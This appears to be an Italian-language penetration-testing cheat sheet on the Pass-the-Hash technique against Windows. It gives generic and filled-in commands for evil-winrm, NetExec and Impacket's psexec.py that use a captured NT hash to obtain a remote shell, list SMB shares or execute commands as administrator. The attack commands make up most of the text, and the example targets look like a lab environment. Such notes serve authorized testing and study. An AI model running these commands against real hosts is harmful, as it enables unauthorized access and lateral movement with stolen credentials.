# Pass-the-Hash (Windows)

| Caratteristica | Dettaglio |
| :--- | :--- |
| **Tool necessari** | `evil-winrm`, `NetExec` (nxc), `Impacket (psexec.py)`, `Mimikatz` |
| **SO Target** | Windows |
| **Quando effettuare** | Dopo aver ottenuto l'hash NT di un utente privilegiato |
| **Info Utili** | Autenticazione senza conoscere la password in chiaro |

### Funzionamento
La tecnica permette di autenticarsi a un servizio remoto utilizzando l'hash NT dell'utente invece della password in chiaro.

### Evil-WinRM
Ideale per ottenere una shell interattiva se l'utente ha accesso a WinRM.

**Comando Generico:**
```bash
evil-winrm -i <IP> -u <USER> -H <NT_HASH>
```
*Esempio:*
```bash
evil-winrm -i 10.10.10.117 -u administrator -H b1820...
```

### NetExec (nxc)
Utile per verificare la validità dell'hash su più macchine o servizi.

**Comando Generico:**
```bash
nxc smb <IP> -u <USER> -H <NT_HASH> --shares
```
*Esempio:*
```bash
nxc smb 10.10.10.117 -u administrator -H b1820... --shares
```

### PsExec (Impacket)
Utile se WinRM non è disponibile ma SMB sì. Richiede privilegi di amministratore locale.

**Comando Generico:**
```bash
psexec.py -hashes :<NT_HASH> <USER>@<IP>
```
*Esempio:*
```bash
psexec.py -hashes :b1820... administrator@10.10.10.117
```

### URL Fondamentali
- [Hacktricks Pass-the-Hash](https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/pass-the-hash.html)
- [Medium - Pass-the-Hash Lateral Movement](https://medium.com/@arianitisufi00/detect-pass-the-hash-lateral-movement-f6fb96f17618)
- [Impacket GitHub](https://github.com/fortra/impacket)
